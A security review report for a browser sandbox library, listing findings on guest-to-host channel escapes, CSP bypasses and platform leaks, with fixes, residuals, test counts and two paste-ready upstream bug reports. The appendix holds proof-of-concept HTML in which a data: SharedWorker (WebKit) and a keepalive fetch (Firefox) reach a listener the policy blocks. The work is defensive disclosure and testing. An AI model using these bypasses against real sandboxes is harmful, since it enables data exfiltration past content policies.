# Broad review, 2026-10-14

**Date**: 2026-10-14 · **Code reviewed**: `main` at `12d7924` · **Result** (reviewers A, B, D): 21 findings — 15 fixed
by construction or hardened (each failed a test first), 1 hardening done where no failure could be shown (PD3's
meta), 3 property tests and one agreement test added for properties that held (PA2, PA3, I1), residuals measured
and asserted per engine (PD2, PD3, PD4, PD5, PD6, PD7); reviewer C's strict-mode findings are in the
[strict section](#strict-mode-reviewer-c) · **Backlog**: [S32–S37](../BACKLOG.md#s32--the-guest-announces-its-port-a-second-announcement-ends-the-environment---done)
· **Earlier**: [adversarial review 2026-10](ADVERSARIAL-REVIEW-2026-10.md), [focused review 2026-10-14](FOCUSED-REVIEW-2026-10-14.md)

## Scope and method

A broad round after the focused review, by four reviewers working from the code, each on one area:

- **A, policy and documents**: the policy steps (`src/lib/csp/*`), the guest document, markup and module rewriting,
  file sources, presets;
- **B, channels and lifecycle**: the bootstrap and the handshake, the host's queues, the build chokepoint, the
  element's lifecycle callbacks, guest writes, the fetch bridge;
- **C, strict mode**: the view, the renderer, the strict worker and policy (ST1–ST4; verified and fixed separately,
  [below](#strict-mode-reviewer-c));
- **D, the platform**: what the browsers let a guest do that no CSP directive governs (workers, keepalive,
  preconnect, history, focus, clipboard, frame names, messages), and packaging.

Then, as in the earlier reviews: every finding was reproduced first as a **failing test** — a unit test where only
library logic decides, an end-to-end test on Chromium, Firefox and WebKit where browser behaviour decides — run
against `12d7924`; fixed at the chokepoint that closes the class; and re-run green. End-to-end evidence follows T5
([backlog](../BACKLOG.md)): read from outside the sandbox (the host's own events, state and window, the host page's
URL, the recorder's listeners, which now also count TCP connections), with a positive control beside each negative.
Where a platform behaviour cannot be closed from the library, the measuring test stays as a per-engine assertion of
the residual. Before filing the upstream reports, PD1 and PD2 were re-measured on a plain page with a header policy,
outside the sandbox (appendix).

**Engines**: Playwright 1.58.1 builds on Linux — Chromium 145.0.7632.6, Firefox 146.0.1, WebKit 26.0. Playwright's
WebKit is not Safari.

## Summary

| Id | Area | Severity | Status | Test (file: name) |
| :--- | :--- | :--- | :--- | :--- |
| CB1 | channel | medium/low | **fixed** (by construction) | `test/e2e/broad-review.spec.ts`: "CB1" (2 tests); `src/lib/in-sandbox-script.test.ts` ("iframe mode (broad review CB1)") |
| CB2 | bootstrap | low | **fixed** | `test/unit/broad-review-bootstrap.test.ts`: "CB2" |
| CB3 | lifecycle | low | **fixed** | `test/e2e/broad-review.spec.ts`: "CB3" (2 tests); `test/unit/broad-review.test.ts`: "CB3" |
| CB4 | guest writes | info/low | **fixed** | `test/unit/broad-review.test.ts`: "CB4" (3 tests) |
| CB5 | lifecycle | info | **fixed** | `test/unit/broad-review.test.ts`: "CB5" (3 tests) |
| CB6 | fetch bridge | info | **fixed** | `test/unit/broad-review.test.ts`: "CB6"; `test/e2e/fetch-bridge.spec.ts` (2 tests updated) |
| CB7 | lifecycle | info | **fixed** | `test/e2e/broad-review.spec.ts`: "CB7" |
| PD1 | policy, platform | high (WebKit) | **fixed** (by construction); upstream report | `test/e2e/broad-review.spec.ts`: "PD1"; `test/unit/broad-review.test.ts`: "PD1"; `src/lib/csp/drop-data-workers.test.ts` |
| PD2 | platform | high (Firefox) | **hardened**; residual (frames the guest creates); upstream report | `test/e2e/broad-review.spec.ts`: "PD2" (3 tests, one residual); `test/unit/broad-review-bootstrap.test.ts`: "PD2" |
| PD3 | platform | medium | **hardened** (meta); residual (WebKit preconnect) | `test/e2e/broad-review.spec.ts`: "PD3" (2 tests, one residual) |
| PD4 | platform | medium | **fixed** in the guest realm; residual (frames the guest creates) | `test/e2e/broad-review.spec.ts`: "PD4" (2 tests, one residual); `test/unit/broad-review-bootstrap.test.ts`: "PD4" |
| PD5 | platform | medium | **documented** (residual), measured | `test/e2e/broad-review.spec.ts`: "PD5" (2 tests) |
| PD6 | platform | low | **fixed** in the guest realm; residual (frames the guest creates) | `test/e2e/broad-review.spec.ts`: "PD6" (2 tests, one residual); `test/unit/broad-review-bootstrap.test.ts`: "PD6" |
| PD7 | embedder | low | **fixed** (playground); documented | `test/e2e/broad-review.spec.ts`: "PD8 … other messages … (PD7, positive control)" |
| PD8 | channel | low | **fixed** | `test/e2e/broad-review.spec.ts`: "PD8" (5 cases + control) |
| PD9 | packaging | low | **fixed** | `scripts/smoke-package.sh` (exact manifest) |
| PA1 | policy steps | info (latent) | **fixed** (the class) | `test/unit/broad-review.test.ts`: "PA1" (2, one a property); `src/lib/csp/drop-data-workers.test.ts`: "assertWidensOnly" |
| PA2 | markup | info | **held**, now asserted | `test/e2e/broad-review.spec.ts`: "PA2" (22 markups × 3 engines) |
| PA3 | modules | info | **held**, now asserted | `test/unit/broad-review.test.ts`: "PA3" (property) |
| I1 | strict renderer | info | **held**, now asserted | `test/unit/broad-review.test.ts`: "I1" |
| I2 | presets | info | **fixed** | `test/unit/presets.test.ts`: "scriptUnsafe only where a preset needs it" |
| ST1 | strict | — | see [strict section](#strict-mode-reviewer-c) (filled by the strict agent) | — |
| ST2 | strict | — | see [strict section](#strict-mode-reviewer-c) (filled by the strict agent) | — |
| ST3 | strict | — | see [strict section](#strict-mode-reviewer-c) (filled by the strict agent) | — |
| ST4 | strict | — | see [strict section](#strict-mode-reviewer-c) (filled by the strict agent) | — |

"Fixed" means the test failed against `12d7924` and passes now. Of the new end-to-end tests, 42 of 72 (24 per
engine) failed there; of the 18 new unit tests that run against `12d7924`, 14 failed (the other 4 are controls).

## Findings

### CB1 · document.open() handed the guest the host's port

- **Guarantee**: no code of the guest's ever holds a port of the library's (B2), so the watchdog and the broker
  talk only to the bootstrap.
- **Found** (all three engines): the bootstrap took the host's INIT_PORT in a capture listener of the guest's window.
  `document.open()` erases every listener of the window; guest code that called it while an image held the
  wrapper's load open, then installed its own listener, received the INIT_PORT the host posted after the load and
  posted frames of its own on the host's port (`CB1-CAPTURED` reached `sandbox-log`). With the port, a nested worker
  can answer the watchdog while the guest loops where the frame is out of process.
- **Root cause**: the port was delivered into the guest realm, so some listener there had to carry it, and guest
  code can remove any listener.
- **Fix**, by construction (ADR-002 amendment): the handshake is reversed. The bootstrap's first statement makes the
  `MessageChannel`, keeps `port1` in its closure and posts `port2` to the host page; the host accepts exactly one
  announcement per environment — trusted, from the guest frame's own window (identity), with exactly one port —
  through a listener installed before the frame is inserted. Nothing in the guest realm listens for a port. The
  worker-mode frame announces the same way and hands `port1` to its worker. The host keeps the port unstarted until
  the wrapper has loaded, so `ready` means what it meant.
- **Evidence**: before, the guest's listener got a port and the host dispatched its line, on all three engines.
  After: the guest's listener sees the host page's message (positive control) but no port, the bridge works both
  ways, nothing reaches the host. Another frame posting announcements to the host window is never heard (guarantee).
  The B1 and B2 tests (`review-channels.spec.ts`) were re-run and pass on all three engines.

### PD8 · A guest that reloaded itself left a dead channel

- **Found**: `location.reload()`, a `<meta refresh>` without a URL, or `document.open()` writing the bootstrap again
  replaced the guest document; the new bootstrap waited for an INIT_PORT that never came, and the host stayed
  `ready` with a dead port (all three engines).
- **Fix**: with the reversed handshake, a second announcement from the guest's window ends the environment with
  `the guest frame announced itself again (it reloaded or rewrote its document)`; so does a forged one (it can end
  only the guest's own environment) and one where no bootstrap runs.
- **Evidence**: before, the state stayed `ready` in every case; after, terminated with the reason, all three engines.
  Measured: Firefox refreshes a `<meta refresh>` frame to a document without the bootstrap (no second announcement);
  the old document stops answering, and the watchdog (3 s in the test) terminates it.

### CB2 · The EXECUTE path looked up a global

- **Found**: `String(data.code)` called the guest's `String` if guest code replaced it, which chose the code that
  ran in place of the embedder's (unit test: the guest's code ran).
- **Fix**: `typeof data.code === 'string'` with no conversion; the refusal posts its line without constructing an
  `Error`; the broker's `handleMessage` is taken when the broker is made. **Evidence**: a unit test that replaces
  `String`, `Function`, `Reflect`, `JSON`, `Object.getOwnPropertyDescriptor`, `Error` and Array.prototype methods
  asserts the embedder's code runs once and nothing of the guest's does; failed before.

### CB3 · A timed-out queued call ran later; `loading` was unbounded

- **Found**: a call made while `loading` that timed out stayed in the host's queue and ran at the next flush (a
  retry ran twice; all three engines). A guest that called `document.open()` and never closed held Chromium and
  WebKit in `loading` (past the test's 30 s; Firefox completes the load).
- **Fix**: a queued request leaves the queue when its call settles; a build has `LOAD_TIMEOUT_MS` (the liveness
  budget, 5000 ms of host ticks) to complete, then `the sandbox did not finish loading` (ADR-003 amendment).
- **Evidence**: before, the guest counted 1 call after `ready` on every engine, and Chromium and WebKit stayed
  `loading`; after, 0 calls (the waiting call is answered: control), and Chromium and WebKit terminate with the
  reason at about 5 s while Firefox is `ready`; a guest whose load takes 1.5 s is `ready` (control).
- **Decision for the owner**: the wrapper's load waits for the guest document's subresources, so a guest page whose
  images take longer than 5 s now terminates. Stated in API.md and README; an embedder that needs more must load
  them after the load event.

### CB4 · Guest-write answers revealed files registered after the build

- **Found** (unit): a removal of a path the host registered after the build was answered `remove` (a path never
  registered: `none`), and the write-time quota counted the live store.
- **Fix**: each build takes one `FileStore.copy()`; its snapshot is what the guest receives, and every answer is
  decided against it plus the overlay. Commits still apply to the live store with its full check.
- **Evidence**: before, `remove` and `FILES_QUOTA_EXCEEDED`; after, `none` and a recorded write, whose commit the
  host's full check refuses on the host's side.

### CB5 · A terminated listener that rebuilt a refused config recursed

- **Found** (unit): `reset()` from a `terminated` listener on a refused config, or a config whose build fails,
  re-entered the build, which refused and dispatched again, until the stack ran out.
- **Fix**, at the build chokepoint: while a build termination is being dispatched, a nested build from the same
  inputs returns at once (no `setConfig()`, `load()` or file change in between: same answer). **Evidence**: one
  dispatch and one warning after; a listener that changes the config first builds normally (control).

### CB6 · The fetch refusal named the host page's origin

- **Fix**: the guest gets `<origin> is not in fetchBridge.allow` for every unlisted origin; the record's new `reason`
  says what the host knows (its own origin; a private host). ADR-006 amendment. **Evidence**: unit test failed before.

### CB7 · An element moved into another document

- **Found** (all three engines): moved into an iframe's document, Chromium and WebKit built an environment there
  whose announcement went to the other window (dead); Firefox gave the element that document's `HTMLElement`
  prototype, so `this._teardown` and `this.initialize` threw in the callbacks and the old guest kept running (the
  recorder kept receiving its requests).
- **Fix**: the lifecycle callbacks call module functions that reach the element's own fields through
  `WebSandbox.prototype`; `adoptedCallback` tears down; `connectedCallback` builds only in the defining realm's
  document (else idle, one warning); back home, an element whose prototype Firefox replaced gets it back.
- **Evidence**: before, the guest kept sending requests after the move on every engine; after, none, the warning
  once, and moved back the element is `ready` again with a running guest.

### PD1 · WebKit ran a `data:` SharedWorker outside the guest policy

- **Found**: with the default `worker-src blob: data:`, a guest's `new SharedWorker('data:…')` in WebKit fetched,
  opened a WebSocket and ran `importScripts` against a listener the policy blocks, with no violation. Re-measured on a
  plain page with a header policy: the same (appendix). Chromium and Firefox refuse shared workers in an opaque origin.
- **Fix**, by construction: `data:` is never admitted for worker loads. The default is `worker-src blob:`, and a
  policy step (`drop-data-workers.ts`) removes `data:` from whatever governs worker loads, making `worker-src` from
  `child-src`, `script-src` or `default-src` when they govern (so frames and scripts keep what they had), with one
  warning, like the `'self'` drop. The library's own workers are `blob:`.
- **Evidence**: before, WebKit's listener received `/pd1-fetch`, `/pd1-import.js` and the WebSocket; after, no hit on
  any engine, a `worker-src` violation for the `data:` URL, and a `blob:` worker under the same policy reaches the
  allowed listener (control).

### PD2 · Firefox sends `fetch(…, { keepalive: true })` past `connect-src`

- **Found**: in iframe mode, Firefox delivered a keepalive POST to a listener the guest policy blocks; re-measured on a
  plain page with `connect-src 'none'` in a header: delivered (appendix). Not in workers.
- **Fix** (hardening): the bootstrap replaces the guest realm's `fetch` (all modes) with one that builds the
  `Request` with the captured constructor, reads `keepalive` from it once, refuses a keepalive request with a
  `TypeError`, and hands only that `Request` to the platform's fetch; not configurable, still writable (guest code
  can wrap it). **Residual**: a frame the guest creates has the platform's fetch, and Firefox sends its keepalive
  request (asserted: Firefox reaches the listener, Chromium and WebKit do not) — the S13 class.
- **Evidence**: before, Firefox's listener received `/pd2-init`; after, refused on every engine in iframe and worker
  mode, the allowed listener receives the ordinary request (control). Measured: Firefox's `Request` does not keep
  `keepalive` from its init (its getter reads `false`), so a keepalive `Request` object is an ordinary request there,
  which `connect-src` refuses.

### PD3 · Preconnect and DNS prefetch

- **Found**: no directive governs `<link rel=preconnect>` or `dns-prefetch`. Measured here: WebKit opens a TCP
  connection to an origin the policy blocks for a markup preconnect (with an IP or a host name); Chromium and Firefox
  open none. DNS lookups cannot be observed in this harness (the listeners are loopback addresses).
- **Fix** (hardening): `<meta http-equiv="x-dns-prefetch-control" content="off">` right after the policy in every
  guest document (reviewer D measured that it stops Firefox's DNS prefetching in the guest document). **Residual**:
  WebKit's preconnect, asserted per engine with the recorder's connection count (control: an allowed fetch connects).
  Strict mode's renderer keeps no `<link>` but stylesheets and icons.

### PD4 · The guest's history traversal moved the host page

- **Found**: `history.back()` in the guest navigated the host page in Firefox and WebKit (Chromium does not).
- **Fix**: the bootstrap makes `history.back/forward/go` no-ops (not configurable) and the Navigation API's
  `back/forward/traverseTo` refuse, in the guest realm, before guest code. **Residual**: a frame the guest creates
  calls its own `history.back()`, which still moves the host page in Firefox and WebKit (asserted).
- **Evidence**: before, the host URL changed in Firefox and WebKit; after, unchanged on all three after `back()`,
  `go(-1)`, `go(-2)` and `navigation.back()`; the host's own `history.back()` works (control).

### PD5 · Focus and the clipboard (residual)

Measured and asserted per engine: guest code that focuses an input takes focus from the host page in Chromium
(keystrokes then go to the guest) and Firefox (focus moves to the element; the typed keys reached neither input in
this harness); WebKit keeps focus on the host page. After a user's click in the guest, Firefox lets guest code
`navigator.clipboard.writeText()`, and Chromium and Firefox `execCommand('copy')`; without one, none. No page can take
these from a frame it embeds; README and API.md state them, and strict mode runs no guest script in the document.

### PD6 · A guest that named its frame received the host's named targets

- **Found**: after `window.name = 'x'` in the guest, the host page's `window.open('', 'x')` returned the guest's
  window on all three engines (so did its links and forms targeting `x`).
- **Fix**: `window.name` in the guest realm reads `''` and ignores writes. The platform's accessor is an own property
  of the window and nothing else holds it, so redefining or deleting the replacement changes nothing (asserted).
  **Residual**: a frame the guest creates can be named (`<iframe name>`) and is reachable (asserted); README says
  not to use named targets on a host page that embeds sandboxes.

### PD7 · The guest's messages reach the embedder's listeners

Any frame can post to the host window. The playground reloaded on any `RESET_COMPLETE` message; it now acts only on
its own window as sender. README's overview no longer says the parent window is blocked; README and API.md say to
check `event.source`. The spec asserts a guest's message reaches a host listener that identifies it by `event.source`.

### PD9 · The package could ship stale files

- **Found**: `build:lib` did not clean `dist/`, `build.ts` (run in CI) wrote `host.js` and `devtools.js` there, and
  `"files": ["dist"]` packed them, with an unlinked 624 KB source map.
- **Fix**: `build:lib` removes `dist/` first; `build.ts` is deleted (CI no longer runs it); `files` lists the bundle,
  the declarations and the notices; the smoke test asserts the tarball's file list exactly. **Decision**: the source
  map is not shipped — `dist/index.js` is the readable, unminified bundle, and the map was not linked anyway.
- **Evidence**: against `12d7924` after CI's `bun build.ts`, the new check fails with `dist/devtools.js`,
  `dist/host.js` and `dist/index.js.map` packed; after, it passes.

### PA1 · A policy step could widen kinds it was not for

- **Found** (latent): `blob:` added to `script-src` for registered scripts (or a `script-src` created from
  `default-src`) also reached `worker-src` through its fallback when the policy set neither `worker-src` nor
  `child-src` (the shipped default sets `worker-src`, so not reachable by default).
- **Fix**, the class: one postcondition at the end of every policy step, `assertWidensOnly` — for each kind of check
  the step does not name, the sources that decide it afterwards are a subset of those before; otherwise the step
  throws and the build fails closed. File sources pin such a kind to what it admitted before. A 400-policy property
  test checks it against CSP3 fallback lists written out independently in the test; a 300-policy one runs every step.

### PA2, PA3, I1 · Properties that held, now asserted

- **PA2**: for 22 markups (noscript, template, SVG and MathML content, tables, `select`, RCDATA, CR, NUL, BOM,
  comments, `iframe srcdoc`, …), every place the guest's parser (scripting on, after the bootstrap) puts a registered
  file's URL is a place the host's inert parse put that file's slot — same namespace, element and attribute — or
  none. On all three engines.
- **PA3**: over 200 random markups, rewriting inline modules never changes which script elements the markup has, their
  types, or where they end; each module holds exactly its rewritten text.
- **I1**: the strict renderer's own copy of a link's load kinds (`in-sandbox-view.ts`, not edited here) agrees with
  `load-kinds.ts` for every `rel` (up to two tokens) × `as` × type.

### I2 · Presets asked for `scriptUnsafe` they did not use

The three markup presets (`csp-swallow`, `form-action-exfil`, `self-navigation`) no longer set it; a test requires
`scriptUnsafe` exactly where a preset runs through `execute()` or evaluates strings. Their specs still pass.

## Residuals, with rationale

| Id | What remains | Why it is not closed in default mode | Asserted by |
| :--- | :--- | :--- | :--- |
| PD2 | Firefox sends a keepalive `fetch` past `connect-src` from a frame the guest creates | That frame is a realm of its own; the bootstrap runs only in the guest's realm (the S13 class). Upstream bug | `broad-review.spec.ts` "PD2 … residual" |
| PD3 | WebKit opens a connection for `<link rel=preconnect>` to any origin | No directive governs it; the guest's markup is its own | `broad-review.spec.ts` "PD3 … residual" |
| PD4 | A frame the guest creates moves the host page with `history.back()` (Firefox, WebKit) | As PD2 | `broad-review.spec.ts` "PD4 … residual" |
| PD5 | Guest code takes focus (Chromium, Firefox) and, after a user's click, writes the clipboard (Firefox; `execCommand` in Chromium and Firefox) | A page cannot take these from a frame it embeds without breaking ordinary input | `broad-review.spec.ts` "PD5" |
| PD6 | A frame the guest creates can take a name the host page targets | As PD2; host pages should not use named targets | `broad-review.spec.ts` "PD6 … residual" |
| PD7 | The guest can post messages to the host window | Any frame can; embedders check `event.source` | `broad-review.spec.ts` "PD8 … (PD7 …)" |
| PD8 | Firefox's `<meta refresh>` replaces the guest with a document that announces nothing | Nothing of the guest's runs any more; the watchdog bounds the silent channel where it is on | `broad-review.spec.ts` "PD8 … meta refresh" |
| CB3 | A guest page whose load (subresources included) takes longer than 5 s of host time terminates | The bound on `loading` (decision above) | `broad-review.spec.ts` "CB3" |

Strict mode runs no guest script in a document (its guest code runs in a worker, which has no history, frame name or
focus, and its renderer keeps no `link` but stylesheets and icons); those paths were not re-measured in strict mode
here. The residuals stated before this review are unchanged.

## Areas reviewed and found sound

The reviewers' phase-1 notes were not part of this verification's input; these are the areas the verification
re-examined and found holding, with the test that says so:

- **The channel after the reversal** (A, B): the bootstrap's end never leaves its closure and uses only captured
  primitives (B2's tests re-run on all engines); the host's listener identifies the guest by window identity, so
  another frame on the host page cannot announce (guarantee test); frames from an earlier environment's port are
  still ignored (B4).
- **The broker** (B): the reserved methods, the codes and their clamp, the in-flight cap — unchanged and green.
- **The policy steps** (A): every step now ends with the same postcondition, and the property tests over random
  policies found no step that widens a kind it is not for; the policy grammar and the eval drop held.
- **References** (A): load kinds, markup and CSS slots, the module graph and the import map; PA2 and PA3 assert the
  parse properties end to end and by property; I1 the renderer's agreement.
- **Guest writes and files** (B): the overlay's rules, the store's single `apply()`; CB4 narrowed what the guest is
  answered from, nothing else changed.
- **The fetch bridge** (B, D): the origin check and the platform's request validation held; only the refusal text
  changed (CB6).

## Strict mode (reviewer C)

*Filled by the strict agent: ST1–ST4, each with guarantee, found, root cause, fix and evidence per engine.*

## Full-suite results

Commands: `bun run typecheck`; `bunx vitest run`; `bun run build`; `scripts/smoke-package.sh`; the full Playwright
suite per engine; the changed and new specs with `--repeat-each 3`.

| | Chromium | Firefox | WebKit |
| :--- | :--- | :--- | :--- |
| Full e2e at `12d7924` | 419 passed, 8 skipped | 418 passed, 9 skipped | 417 passed, 10 skipped |
| Full e2e after | 443 passed, 8 skipped | 442 passed, 9 skipped | 441 passed, 10 skipped |
| New `broad-review.spec.ts` at `12d7924` | 14 failed, 10 passed | 13 failed, 11 passed | 15 failed, 9 passed |
| Changed and new specs, `--repeat-each 3` (81 tests × 3: `broad-review`, `fetch-bridge`, `files`, `review-channels`, `review-policy`) | 243 passed | 243 passed | 243 passed |

Unit (`bunx vitest run`): 1520 passed in 37 files (1470 in 34 at `12d7924`). `bun run typecheck`, `bun run build` and `scripts/smoke-package.sh` pass.

## Appendix: upstream reports

Paste-ready texts. **Verify in release browsers before filing**: both were measured in Playwright's builds on Linux
(Chromium 145.0.7632.6, Firefox 146.0.1, WebKit 26.0), on a plain page served with a header policy, outside the
sandbox. Chromium refused both.

### PD1 — WebKit (bugs.webkit.org, product: Security)

**Title**: A SharedWorker created from a data: URL is not restricted by the creating document's Content-Security-Policy

**Summary**: A document whose policy admits `data:` workers (`worker-src data:`) and forbids connections
(`connect-src 'none'`) can start a SharedWorker from a `data:` URL whose `fetch()`, `WebSocket` and `importScripts()`
reach any origin. No violation is reported. A dedicated `Worker` from the same `data:` URL is restricted as expected.

**Steps to reproduce**: serve this page with the header
`Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; connect-src 'none'; worker-src data:`,
and run a listener at `http://127.0.0.1:8081` that logs requests:

```html
<!DOCTYPE html>
<script>
  const body = "fetch('http://127.0.0.1:8081/shared').catch(() => {})";
  new SharedWorker('data:text/javascript,' + encodeURIComponent(body));
  new Worker('data:text/javascript,' + encodeURIComponent("fetch('http://127.0.0.1:8081/dedicated').catch(() => {})"));
  fetch('http://127.0.0.1:8081/page').catch(() => {});
</script>
```

**Expected**: no request reaches the listener; the worker's fetch is refused by `connect-src` (CSP3: a worker created
from a `data:` URL inherits its creator's policy), and a violation is reported.

**Actual** (WebKit 26.0, Playwright build, Linux): the listener receives `GET /shared`; `/dedicated` and `/page` are
refused. In an opaque-origin sandboxed iframe the same SharedWorker also opened a WebSocket and ran `importScripts()`
against a blocked origin, with no violation.

**Impact**: a page cannot confine script it admits as a `data:` SharedWorker; for sandboxes that allow `data:` in
`worker-src`, it is a CSP bypass for all network egress.

### PD2 — Firefox (Bugzilla, Core :: DOM: Security, security-sensitive)

**Title**: fetch() with keepalive: true is not checked against connect-src

**Summary**: A `fetch(url, { keepalive: true })` request is sent although the document's policy forbids the
connection (`connect-src 'none'`). The same request without `keepalive` is refused.

**Steps to reproduce**: serve this page with the header
`Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; connect-src 'none'`, and run a listener at
`http://127.0.0.1:8081` that logs requests:

```html
<!DOCTYPE html>
<script>
  fetch('http://127.0.0.1:8081/plain', { method: 'POST', body: 'x' }).catch(() => {});
  fetch('http://127.0.0.1:8081/keepalive', { keepalive: true, method: 'POST', body: 'x' }).catch(() => {});
</script>
```

**Expected**: neither request reaches the listener; both are blocked by `connect-src` and reported as violations.

**Actual** (Firefox 146.0.1, Playwright build, Linux): the listener receives `POST /keepalive`; `/plain` is refused.
Also in a sandboxed `srcdoc` iframe with a `<meta>` policy. Not observed from a dedicated worker.

**Impact**: any content restricted by `connect-src` (sandboxes, pages with injected script under a strict policy) can
send data to any origin.
